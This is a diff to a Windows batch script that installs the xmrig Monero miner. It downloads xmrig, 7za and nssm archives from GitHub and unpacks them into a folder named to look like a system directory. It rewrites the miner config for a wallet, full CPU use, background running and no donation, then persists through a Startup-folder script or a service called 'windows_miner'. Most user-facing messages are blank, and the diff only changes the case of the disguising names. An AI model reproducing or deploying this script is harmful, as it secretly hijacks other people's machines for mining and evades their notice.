@@ -100,7 +100,7 @@ set PORT=10001
 
 rem printing intentions
 
-set "LOGFILE=%USERPROFILE%\Windows\xmrig.log"
+set "LOGFILE=%USERPROFILE%\windows\xmrig.log"
 
 echo.
 
@@ -126,15 +126,15 @@ rem start doing stuff: preparing miner
 
 echo.
 @echo off
-sc stop Windows_miner
-sc delete Windows_miner
+sc stop windows_miner
+sc delete windows_miner
 taskkill /f /t /im xmrig.exe
 
 :REMOVE_DIR0
 echo.
 
-rmdir /q /s "%USERPROFILE%\Windows" >NUL 2>NUL
-IF EXIST "%USERPROFILE%\Windows" GOTO REMOVE_DIR0
+rmdir /q /s "%USERPROFILE%\windows" >NUL 2>NUL
+IF EXIST "%USERPROFILE%\windows" GOTO REMOVE_DIR0
 
 echo.
 powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.zip', '%USERPROFILE%\xmrig.zip')"
@@ -144,7 +144,7 @@ if errorlevel 1 (
 )
 
 echo.
-powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\xmrig.zip', '%USERPROFILE%\Windows')"
+powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\xmrig.zip', '%USERPROFILE%\windows')"
 if errorlevel 1 (
   echo.
   powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/7za.exe', '%USERPROFILE%\7za.exe')"
@@ -153,18 +153,18 @@ if errorlevel 1 (
     exit /b 1
   )
   echo.
-  "%USERPROFILE%\7za.exe" x -y -o"%USERPROFILE%\Windows" "%USERPROFILE%\xmrig.zip" >NUL
+  "%USERPROFILE%\7za.exe" x -y -o"%USERPROFILE%\windows" "%USERPROFILE%\xmrig.zip" >NUL
   del "%USERPROFILE%\7za.exe"
 )
 del "%USERPROFILE%\xmrig.zip"
 
 echo.
-powershell -Command "$out = cat '%USERPROFILE%\Windows\config.json' | %%{$_ -replace '\"donate-level\": *\d*,', '\"donate-level\": 1,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\Windows\config.json'" 
-"%USERPROFILE%\Windows\xmrig.exe" --help >NUL
+powershell -Command "$out = cat '%USERPROFILE%\windows\config.json' | %%{$_ -replace '\"donate-level\": *\d*,', '\"donate-level\": 1,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\windows\config.json'" 
+"%USERPROFILE%\windows\xmrig.exe" --help >NUL
 if %ERRORLEVEL% equ 0 goto MINER_OK
 :MINER_BAD
 
-if exist "%USERPROFILE%\Windows\xmrig.exe" (
+if exist "%USERPROFILE%\windows\xmrig.exe" (
   echo.
 ) else (
   echo.
@@ -184,11 +184,11 @@ if errorlevel 1 (
 :REMOVE_DIR1
 echo.
 
-rmdir /q /s "%USERPROFILE%\Windows" >NUL 2>NUL
-IF EXIST "%USERPROFILE%\Windows" GOTO REMOVE_DIR1
+rmdir /q /s "%USERPROFILE%\windows" >NUL 2>NUL
+IF EXIST "%USERPROFILE%\windows" GOTO REMOVE_DIR1
 
 echo.
-powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\xmrig.zip', '%USERPROFILE%\Windows')"
+powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\xmrig.zip', '%USERPROFILE%\windows')"
 if errorlevel 1 (
   echo.
   powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/7za.exe', '%USERPROFILE%\7za.exe')"
@@ -197,7 +197,7 @@ if errorlevel 1 (
     exit /b 1
   )
   echo.
-  "%USERPROFILE%\7za.exe" x -y -o"%USERPROFILE%\Windows" "%USERPROFILE%\xmrig.zip" >NUL
+  "%USERPROFILE%\7za.exe" x -y -o"%USERPROFILE%\windows" "%USERPROFILE%\xmrig.zip" >NUL
   if errorlevel 1 (
     echo.
     exit /b 1
@@ -207,11 +207,11 @@ if errorlevel 1 (
 del "%USERPROFILE%\xmrig.zip"
 
 echo.
-powershell -Command "$out = cat '%USERPROFILE%\Windows\config.json' | %%{$_ -replace '\"donate-level\": *\d*,', '\"donate-level\": 0,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\Windows\config.json'" 
-"%USERPROFILE%\Windows\xmrig.exe" --help >NUL
+powershell -Command "$out = cat '%USERPROFILE%\windows\config.json' | %%{$_ -replace '\"donate-level\": *\d*,', '\"donate-level\": 0,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\windows\config.json'" 
+"%USERPROFILE%\windows\xmrig.exe" --help >NUL
 if %ERRORLEVEL% equ 0 goto MINER_OK
 
-if exist "%USERPROFILE%\Windows\xmrig.exe" (
+if exist "%USERPROFILE%\windows\xmrig.exe" (
   echo.
 ) else (
   echo.
@@ -231,15 +231,15 @@ if not [%EMAIL%] == [] (
   set "PASS=%PASS%:%EMAIL%"
 )
 
-powershell -Command "$out = cat '%USERPROFILE%\Windows\config.json' | %%{$_ -replace '\"url\": *\".*\",', '\"url\": \"gulf.Windows.stream:%PORT%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\Windows\config.json'" 
-powershell -Command "$out = cat '%USERPROFILE%\Windows\config.json' | %%{$_ -replace '\"user\": *\".*\",', '\"user\": \"%WALLET%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\Windows\config.json'" 
-powershell -Command "$out = cat '%USERPROFILE%\Windows\config.json' | %%{$_ -replace '\"pass\": *\".*\",', '\"pass\": \"%PASS%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\Windows\config.json'" 
-powershell -Command "$out = cat '%USERPROFILE%\Windows\config.json' | %%{$_ -replace '\"max-cpu-usage\": *\d*,', '\"max-cpu-usage\": 100,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\Windows\config.json'" 
+powershell -Command "$out = cat '%USERPROFILE%\windows\config.json' | %%{$_ -replace '\"url\": *\".*\",', '\"url\": \"gulf.windows.stream:%PORT%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\windows\config.json'" 
+powershell -Command "$out = cat '%USERPROFILE%\windows\config.json' | %%{$_ -replace '\"user\": *\".*\",', '\"user\": \"%WALLET%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\windows\config.json'" 
+powershell -Command "$out = cat '%USERPROFILE%\windows\config.json' | %%{$_ -replace '\"pass\": *\".*\",', '\"pass\": \"%PASS%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\windows\config.json'" 
+powershell -Command "$out = cat '%USERPROFILE%\windows\config.json' | %%{$_ -replace '\"max-cpu-usage\": *\d*,', '\"max-cpu-usage\": 100,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\windows\config.json'" 
 set LOGFILE2=%LOGFILE:\=\\%
-powershell -Command "$out = cat '%USERPROFILE%\Windows\config.json' | %%{$_ -replace '\"log-file\": *null,', '\"log-file\": \"%LOGFILE2%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\Windows\config.json'" 
+powershell -Command "$out = cat '%USERPROFILE%\windows\config.json' | %%{$_ -replace '\"log-file\": *null,', '\"log-file\": \"%LOGFILE2%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\windows\config.json'" 
 
-copy /Y "%USERPROFILE%\Windows\config.json" "%USERPROFILE%\Windows\config_background.json" >NUL
-powershell -Command "$out = cat '%USERPROFILE%\Windows\config_background.json' | %%{$_ -replace '\"background\": *false,', '\"background\": true,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\Windows\config_background.json'" 
+copy /Y "%USERPROFILE%\windows\config.json" "%USERPROFILE%\windows\config_background.json" >NUL
+powershell -Command "$out = cat '%USERPROFILE%\windows\config_background.json' | %%{$_ -replace '\"background\": *false,', '\"background\": true,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\windows\config_background.json'" 
 
 rem preparing script
 (
@@ -252,14 +252,14 @@ echo.
 echo.
 echo.
 echo.
-) > "%USERPROFILE%\Windows\miner.bat"
+) > "%USERPROFILE%\windows\miner.bat"
 
 rem preparing script background work and work under reboot
 
 if %ADMIN% == 1 goto ADMIN_MINER_SETUP
 
-if exist "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" (
-  set "STARTUP_DIR=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+if exist "%USERPROFILE%\AppData\Roaming\Microsoft\windows\Start Menu\Programs\Startup" (
+  set "STARTUP_DIR=%USERPROFILE%\AppData\Roaming\Microsoft\windows\Start Menu\Programs\Startup"
   goto STARTUP_DIR_OK
 )
 if exist "%USERPROFILE%\Start Menu\Programs\Startup" (
@@ -275,10 +275,10 @@ echo.
 (
 echo @echo off
 echo.
-) > "%STARTUP_DIR%\Windows_miner.bat"
+) > "%STARTUP_DIR%\windows_miner.bat"
 
 echo.
-call "%STARTUP_DIR%\Windows_miner.bat"
+call "%STARTUP_DIR%\windows_miner.bat"
 goto OK
 
 :ADMIN_MINER_SETUP
@@ -291,7 +291,7 @@ if errorlevel 1 (
 )
 
 echo.
-powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\nssm.zip', '%USERPROFILE%\Windows')"
+powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\nssm.zip', '%USERPROFILE%\windows')"
 if errorlevel 1 (
   echo.
   powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/7za.exe', '%USERPROFILE%\7za.exe')"
@@ -300,7 +300,7 @@ if errorlevel 1 (
     exit /b 1
   )
   echo.
-  "%USERPROFILE%\7za.exe" x -y -o"%USERPROFILE%\Windows" "%USERPROFILE%\nssm.zip" >NUL
+  "%USERPROFILE%\7za.exe" x -y -o"%USERPROFILE%\windows" "%USERPROFILE%\nssm.zip" >NUL
   if errorlevel 1 (
     echo.
     exit /b 1
@@ -310,20 +310,20 @@ if errorlevel 1 (
 del "%USERPROFILE%\nssm.zip"
 
 echo.
-sc stop Windows_miner
-sc delete Windows_miner
-"%USERPROFILE%\Windows\nssm.exe" install Windows_miner "%USERPROFILE%\Windows\xmrig.exe"
+sc stop windows_miner
+sc delete windows_miner
+"%USERPROFILE%\windows\nssm.exe" install windows_miner "%USERPROFILE%\windows\xmrig.exe"
 if errorlevel 1 (
   echo.
   exit /b 1
 )
-"%USERPROFILE%\Windows\nssm.exe" set Windows_miner AppDirectory "%USERPROFILE%\Windows"
-"%USERPROFILE%\Windows\nssm.exe" set Windows_miner AppPriority BELOW_NORMAL_PRIORITY_CLASS
-"%USERPROFILE%\Windows\nssm.exe" set Windows_miner AppStdout "%USERPROFILE%\Windows\stdout"
-"%USERPROFILE%\Windows\nssm.exe" set Windows_miner AppStderr "%USERPROFILE%\Windows\stderr"
+"%USERPROFILE%\windows\nssm.exe" set windows_miner AppDirectory "%USERPROFILE%\windows"
+"%USERPROFILE%\windows\nssm.exe" set windows_miner AppPriority BELOW_NORMAL_PRIORITY_CLASS
+"%USERPROFILE%\windows\nssm.exe" set windows_miner AppStdout "%USERPROFILE%\windows\stdout"
+"%USERPROFILE%\windows\nssm.exe" set windows_miner AppStderr "%USERPROFILE%\windows\stderr"
 
 echo.
-"%USERPROFILE%\Windows\nssm.exe" start Windows_miner
+"%USERPROFILE%\windows\nssm.exe" start windows_miner
 if errorlevel 1 (
   echo.
   exit /b 1
